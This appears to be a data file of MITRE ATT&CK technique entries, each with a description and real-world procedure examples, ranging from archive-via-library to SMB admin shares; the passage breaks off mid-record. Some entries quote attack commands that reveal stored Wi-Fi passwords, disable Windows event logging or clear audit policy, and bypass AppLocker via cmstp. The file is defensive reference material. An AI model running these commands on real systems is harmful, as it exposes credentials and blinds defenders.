T1560.002,Archive via Library,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python] rarfile , libzip , and zlib . Most libraries include functionality to encrypt and/or compress data.  Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.","['[TajMahal] has the ability to use the open source libraries XZip/Xunzip and zlib to compress files.', 'The [ZLib] backdoor compresses communications using the standard Zlib compression library.', '[BBSRAT] can compress data with ZLIB prior to sending it back to the C2 server.', '[InvisiMole] can use zlib to compress and decompress data.', '[SeaDuke] compressed data with zlib prior to sending it over C2.', '[Denis] compressed collected data using zlib.', '[Epic] compresses the collected data with bzip2 before sending it to the C2 server.', '[BADFLICK] has compressed data using the aPLib compression library.', '[Cardinal RAT] applies compression to C2 traffic using the ZLIB library.', '[OSX_OCEANLOTUS.D] scrambles and encrypts data using AES256 before sending it to the C2 server.', '[Lazarus Group] malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.', '[FoggyWeb] can invoke the `Common.Compress` method to compress data with the C# GZipStream compression class.', '[FunnyDream] has compressed collected files with zLib.', '[Threat Group-3390] has used RAR to compress, encrypt, and password-protect files prior to exfiltration.', '[Gelsemium] can compress embedded executables with the zlib library.']",
T1055.003,Thread Execution Hijacking,"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.   Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.  This is very similar to [Process Hollowing] but targets an existing process rather than creating a process in a suspended state.    Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ","['[Waterbear] can use thread injection to inject shellcode into the process of security software.', '[Gazer] performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.', '[Trojan.Karagany] can inject a suspended thread of its own process into a new process and initiate via the <code>ResumeThread</code> API.']",
T1546.011,Application Shimming,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.   Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.   A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:  * <code>%WINDIR%\AppPatch\sysmain.sdb</code> and * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>  Custom databases are stored in:  * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> and * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>  To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control] (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).  Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs.","['[Pillowmint] has used a malicious shim database to maintain persistence.', '[SDBbot] has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe.', '[FIN7] has used application shim databases for persistence.', '[ShimRat] has installed shim databases in the <code>AppPatch</code> folder.']",
T1547.010,Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup. This DLL can be located in <code>C:\Windows\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.   Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. The Registry key contains entries for the following:  * Local Port * Standard TCP/IP Port * USB Monitor * WSD Port ",[],False
T1070.008,Clear Mailbox Data,"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests.   Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing] Spearphishing] [Email Collection] [Mail Protocols] for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol] For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell] module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports. On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript] to interact with APIs on macOS.  Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.","['[Goopy] has the ability to delete emails used for C2 once the content has been copied.', 'During the [SolarWinds Compromise] [APT29] removed evidence of email export requests using `Remove-MailboxExportRequest`.', '[APT29] removed evidence of email export requests using <code>Remove-MailboxExportRequest</code>.']",False
T1037.002,Login Hook,"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.   Adversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.  **Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon] and [Launch Agent] ",[],False
T1567.004,Exfiltration Over Webhook,"Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application.   Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration] of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.  Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.",[],False
T1021.008,Direct Cloud VM Connections,"Adversaries may leverage [Valid Accounts] to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API] such as Azure Serial Console, AWS EC2 Instance Connect, and AWS System Manager..  Methods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access.   Adversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment. These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command]",[],False
T1070.006,Timestomp,"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.  Timestomping may be used along with file name [Masquerading] to hide malware and tools.","['[TAINTEDSCRIBE] can change the timestamp of specified filenames.', '[APT28] has performed timestomping on victim files.', '[Cyclops Blink] has the ability to use the Linux API function `utime` to change the timestamps of modified firmware update images.', '[APT5] has modified file timestamps.', 'For early [Gazer] versions, the compilation timestamp was faked.', '[Stuxnet] extracts and writes driver files that match the times of other legitimate files.', '[Bankshot] modifies the time of a file as specified by the control server.', '[FALLCHILL] can modify file or directory timestamps.', '[OwaAuth] has a command to timestop a file or directory.', 'During [Cutting Edge] threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity.', '[NightClub] can modify the Creation, Access, and Write timestamps for malicious DLLs to match those of the genuine Windows DLL user32.dll.', '[USBStealer] sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.', '[BitPaymer] can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.', 'The [Derusbi] malware supports timestomping.', '[Cobalt Strike] can timestomp any files or payloads placed on a target machine to help them blend in.', '[OSX_OCEANLOTUS.D] can use the <code>touch -t</code> command to change timestamps.', ""[PowerStallion] modifies the MAC times of its local log files to match that of the victim's desktop.ini file."", '[SEASHARPEE] can timestomp files on victims using a Web shell.', '[Elise] performs timestomping of a CAB file it creates.', '[APT38] has modified data timestamps to mimic files that are in the same folder on a compromised host.', '[APT32] has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, [APT32] has used a random value to modify the timestamp of the file storing the clientID.', '[Kimsuky] has manipulated timestamps for creation or compilation dates to defeat anti-forensics.', '[KeyBoy] time-stomped its DLL in order to evade detection.', '[EVILNUM] has changed the creation date of files.', '[BLINDINGCAN] has modified file and directory timestamps.', '[MacMa] has the capability to create and modify file timestamps.', '[Kobalos] can modify timestamps of replaced files, such as <code>ssh</code> with the added credential stealer or <code>sshd</code> used to deploy [Kobalos] ', '[PingPull] has the ability to timestomp a file.', '[APT29] has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.', '[Attor] has manipulated the time of last access to files and registry keys after they have been created or modified.', 'During the [SolarWinds Compromise] [APT29] modified timestamps of backdoors to match legitimate Windows files.', '[China Chopper] server component can change the timestamp of files.', '[InvisiMole] samples were timestomped by the authors by setting the PE timestamps to all zero values. [InvisiMole] also has a built-in command to modify file times.', '[Gelsemium] has the ability to perform timestomping of files on targeted systems.', '[Winnti for Windows] can set the timestamps for its worker and service components to match that of cmd.exe.', 'During the [C0032] campaign, [TEMP.Veles] used timestomping to modify the <code>$STANDARD_INFORMATION</code> attribute on tools.', '[Chimera] has used a Windows version of the Linux <code>touch</code> command to modify the date and time stamp on DLLs.', ""After creating a new service for persistence, [TDTESS] sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file."", 'Several [Lazarus Group] malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.', '[3PARA RAT] has a command to set certain attributes such as creation/modification timestamps on files.', '[POSHSPY] modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.', '[Psylo] has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.', '[Ninja] can change or create the last access or write times.', 'Many [Misdat] samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.', '[Shamoon] can change the modified time for files to evade forensic detection.\t', '[metaMain] can change the `CreationTime`, `LastAccessTime`, and `LastWriteTime` file time attributes when executed with `SYSTEM` privileges.', '[Empire] can timestomp any files or payloads placed on a target machine to help them blend in.', '[Rocke] has changed the time stamp of certain files.\t', '[TEMP.Veles] used timestomping to modify the $STANDARD_INFORMATION attribute on tools.', '[APT29] modified timestamps of backdoors to match legitimate Windows files.', '[UNC2452] modified timestamps of backdoors to match legitimate Windows files.', '[Cobalt Strike] will timestomp any files or payloads placed on a target machine to help them blend in.']",
T1016.002,Wi-Fi Discovery,"Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery] [Remote System Discovery] and other discovery or [Credential Access] activity to support both ongoing and future campaigns.  Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name” key=clear` to show a Wi-Fi network’s corresponding password. Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API] functions.  On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`. On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password). ","['[Magic Hound] has collected names and passwords of all Wi-Fi networks to which a device has previously connected.', '[Agent Tesla] can collect names and passwords of all Wi-Fi networks to which a device has previously connected.', '[Emotet] can extract names of all locally reachable Wi-Fi networks and then perform a brute-force attack to spread to new networks.']",False
T1564.011,Ignore Process Interrupts,"Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes.   Adversaries may invoke processes using `nohup`, [PowerShell] `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups. This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.  Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap] this does not establish [Persistence] since the process will not be re-invoked once actually terminated.","['The [GoldMax] Linux variant has been executed with the `nohup` command to ignore hangup signals and continue to run if the terminal session was terminated.', '[OSX/Shlayer] has used the `nohup` command to instruct executed payloads to ignore hangup signals.']",False
T1547.009,Shortcut Modification,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.  Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment] adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading] to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.  Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions] to persistently launch malware.","['[RogueRobin] establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in.', '[RedLeaves] attempts to add a shortcut file in the Startup folder to achieve persistence.', '[Okrum] can establish persistence by creating a .lnk shortcut to itself in the Startup folder.', '[Reaver] creates a shortcut file and saves it in a Startup folder to establish persistence.', '[Grandoreiro] can write or modify browser shortcuts to enable launching of malicious browser extensions. ', '[APT39] has modified LNK shortcuts.', '[Helminth] establishes persistence by creating a shortcut.', '[MarkiRAT] can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable.', '[Micropsia] creates a shortcut to maintain persistence.', '[Leviathan] has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.', 'To establish persistence, [SslMM] identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.', '[Lazarus Group] malware has maintained persistence on a system by creating a LNK shortcut in the user’s Startup folder.', '[Comnie] establishes persistence via a .lnk file in the victim’s startup path.', '[Gazer] can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.', 'The [BlackEnergy] 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.', ""[SPACESHIP] achieves persistence by creating a shortcut in the current user's Startup folder."", '[TinyZBot] can create a shortcut in the Windows startup folder for persistence.', '[Astaroth] initial payload is a malicious .LNK file. ', '[S-Type] may create the file <code>%HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk</code>, which points to the malicious `msdtc.exe` file already created in the `%CommonFiles%` directory.', '[SHIPSHAPE] achieves persistence by creating a shortcut in the Startup folder.', '[Gorgon Group] malware can create a .lnk file and add a Registry Run key to establish persistence.', '[BACKSPACE] achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.', '[SeaDuke] is capable of persisting via a .lnk file stored in the Startup directory.', '[InvisiMole] can use a .lnk shortcut for the Control Panel to establish persistence.', '[FELIXROOT] creates a .LNK file for persistence.', 'A version of [KONNI] drops a Windows shortcut on the victim’s machine to establish persistence.', '[Bazar] can establish persistence by writing shortcuts to the Windows Startup folder.', '[Empire] can persist by modifying a .LNK file to include a backdoor.', '[Kazuar] adds a .lnk file to the Windows startup folder.', '[Dragonfly] has manipulated .lnk files to gather user credentials in conjunction with [Forced Authentication]', '[Stuxnet] used copies of .lnk shortcuts to propagate through removable media.', '[APT29] drops a Windows shortcut file for execution.', '[Darkhotel] has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.', '[Dragonfly 2.0] manipulated .lnk files to gather user credentials in conjunction with [Forced Authentication]']",False
T1087.003,Email Account,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).  In on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.  In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.","['[TA505] has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.', '[Magic Hound] has used Powershell to discover email accounts.', '[Grandoreiro] can parse Outlook .pst files to extract e-mail addresses.', '[Sandworm Team] used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.\t', 'During [C0027] [Scattered Spider] accessed Azure AD to identify email addresses.', '[Backdoor.Oldrea] collects address book information from Outlook.', '[TrickBot] collects email addresses from Outlook.', '[Lizar] can collect email accounts from Microsoft Outlook and Mozilla Thunderbird. ', '[Ruler] can be used to enumerate Exchange users and dump the GAL.', '[MailSniper] can be used to obtain account names from Exchange and Office 365 using the <code>Get-GlobalAddressList</code> cmdlet.', '[Emotet] has been observed leveraging a module that can scrape email addresses from Outlook.', '[BoomBox] can execute an LDAP query to discover e-mail accounts for domain users.']",
T1497.003,Time Based Evasion,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.  Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job] Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels] to avoid analysis and scrutiny.  Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping] may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to [Native API] functions in order to delay execution (while also potentially overloading analysis environments with junk data).  Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.","['After initial installation, [Raindrop] runs a computation to delay execution.', '[P8RAT] has the ability to ""sleep"" for a specified time to evade detection.', '[SUNBURST] remained dormant after initial access for a period of up to two weeks.', '[BendyBear] can check for analysis environments and signs of debugging using the Windows API <code>kernel32!GetTickCountKernel32</code> call. ', '[Egregor] can perform a  long sleep (greater than or equal to 3 minutes) to evade detection.', '[Clop] has used the <code>sleep</code> command to avoid sandbox detection.', '[SodaMaster] has the ability to put itself to ""sleep"" for a specified time.', '[Clambling] can wait 30 minutes before initiating contact with C2.', '[Ursnif] has used a 30 minute delay after execution to evade sandbox monitoring tools.', '[Okrum] loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.', '[FatDuke] can turn itself on or off at random intervals.', '[DarkTortilla] can implement the `kernel32.dll` Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package.', '[Bumblebee] has the ability to set a hardcoded and randomized sleep interval.', '[Crimson] can determine when it has been installed on a host for at least 15 days before downloading the final payload.', '[Saint Bot] has used the command `timeout 20` to pause the execution of its initial loader.', 'During [Operation Dream Job] [Lazarus Group] used tools that collected `GetTickCount` and `GetSystemTimeAsFileTime` data to detect sandbox or VMware services.', '[Tomiris] has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems.', '[HermeticWiper] has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host.', '[Lokibot] has performed a time-based anti-debug check before downloading its third stage.', '[Snip3] can execute `WScript.Sleep` to delay execution of its second stage.', '[Bisonal] has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing. ', '[StrifeWater] can modify its sleep time responses from the default of 20-22 seconds.', '[Pony] has delayed execution using a built-in function to avoid detection and analysis.\t', '[TrickBot] has used <code>printf</code> and file I/O loops to delay process execution as part of API hammering.', '[metaMain] has delayed execution for five to six minutes during its persistence establishment process.', 'The [QakBot] dropper can delay dropping the payload to evade detection.', '[LiteDuke] can wait 30 seconds before executing additional code if security software is detected.', '[GrimAgent] can sleep for 195 - 205 seconds after payload execution and before deleting its task.', '[Bazar] can use a timer to delay execution of core functionality.', '[EvilBunny] has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.', '[BADFLICK] has delayed communication to the actor-controlled IP address by 5 minutes.', '[GoldenSpy] installer has delayed installation of [GoldenSpy] for two hours after it reaches a victim system.\t', '[WhisperGate] can pause for 20 seconds to bypass antivirus solutions.', '[DRATzarus] can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to measure function timing. [DRATzarus] can also remotely shut down into sleep mode under specific conditions to evade  detection.', '[GoldMax] has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.', '[GuLoader] has the ability to perform anti-debugging based on time checks, API calls, and CPUID.', '[SVCReady] can enter a sleep stage for 30 minutes to evade detection.', '[Brute Ratel C4] can call `NtDelayExecution` to pause execution.', ""Using the machine's local time, [XCSSET] waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, <code>.report</code>. After the elapsed time, [XCSSET] executes additional modules."", ""[ThiefQuest] invokes <code>time</code> call to check the system's time, executes a <code>sleep</code> command, invokes a second <code>time</code> call, and then compares the time difference between the two <code>time</code> calls and the amount of time the system slept to identify the sandbox."", '[AppleJeus] has waited a specified time before downloading a second stage payload.']",
T1218.003,CMSTP,"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.  Adversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to [Regsvr32] / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.  CMSTP.exe can also be abused to [Bypass User Account Control] and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.   ","['[MuddyWater] has used CMSTP.exe and a malicious INF to execute its [POWERSTATS] payload.', '[Cobalt Group] has used the command <code>cmstp.exe /s /ns C:\\Users\\ADMINI~W\\AppData\\Local\\Temp\\XKNqbpzl.txt</code> to bypass AppLocker and launch a malicious script.']",False
T1563.001,SSH Hijacking,"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.  In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.  [SSH Hijacking] differs from use of [SSH] because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts]",[],
T1562.002,Disable Windows Event Logging,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.  The EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\Local Policies\Audit Policy</code> for basic audit policy settings or <code>Security Settings\Advanced Audit Policy Configuration</code> for advanced audit policy settings. <code>auditpol.exe</code> may also be used to set audit policies.  Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>). Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog</code> then restarting the system for the change to take effect.  There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the ""Start"" value in the key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security</code>, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application</code> to disable the entire EventLog.  Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.  By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.","['[Wevtutil] can be used to disable specific event logs on the system.', '[Threat Group-3390] has used appcmd.exe to disable logging on a victim server.', '[Magic Hound] has executed scripts to disable the event log service.', 'During the [SolarWinds Compromise] [APT29] used `AUDITPOL` to prevent the collection of audit logs.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] disabled event logging on compromised systems.', '[APT29] used <code>AUDITPOL</code> to prevent the collection of audit logs.', '[Sandworm Team] has disabled event logging on compromised systems.', '[UNC2452] used <code>AUDITPOL</code> to prevent the collection of audit logs.']",False
T1021.002,SMB/Windows Admin Shares,"Adversaries may use [Valid Accounts] to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.  SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.  Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts] to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job] [Service Execution] and [Windows Management Instrumentation] Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash] and certain configuration and patch levels.","['[Conti] can spread via SMB and encrypts files on different hosts, potentially compromising an entire network.', '[Moses Staff] has used batch scripts that can enable SMB on a compromised host.', '[Threat Group-1314] actors mapped network drives using <code>net use</code>.', '[HermeticWizard] can use a list of hardcoded credentials to to authenticate via NTLMSSP to the SMB shares on remote systems.', '[Emotet] has leveraged the Admin$, C$, and IPC$ shares for lateral movement.  ', '[zwShell] has been copied over network shares to move laterally.', '[Ryuk] has used the C$ network share for lateral movement.', '[PsExec] a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems.', '[Wizard Spider] has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.', '[Shamoon] accesses network share(s), enables share access to the target device, copies an executable payload to the target system, and uses a [Scheduled Task/Job] to execute the malware.', '[APT41] has transferred implant files using Windows Admin Shares.', '[Royal] can use SMB to connect to move laterally.', '[Ke3chang] actors have been known to copy files to the network shares of other computers to move laterally.', '[NotPetya] can use [PsExec] which interacts with the <code>ADMIN$</code> network share to execute commands on remote systems.', '[Turla] used <code>net use</code> commands to connect to lateral systems within a network.', '[Diavol] can spread throughout a network via SMB prior to encryption.', '[BlackEnergy] has run a plug-in on a victim to spread through the local network by using [PsExec] and accessing admin shares.', 'During the [SolarWinds Compromise] [APT29] used administrative accounts to connect over SMB to targeted users.', '[FIN13] has leveraged SMB to move laterally within a compromised network via application servers and SQL servers.', '[Chimera] has used Windows admin shares to move laterally.', '[Fox Kitten] has used valid accounts to access SMB shares.', '[Brute Ratel C4] has the ability to use SMB to pivot in compromised networks.', '[Zox] has the ability to use SMB for communication.', '[Conficker] variants spread through NetBIOS share propagation.', '[Sandworm Team] has copied payloads to the `ADMIN$` share of remote systems and run <code>net use</code> to connect to network shares.', 'During [Operation Wocao] threat actors used [Impacket] 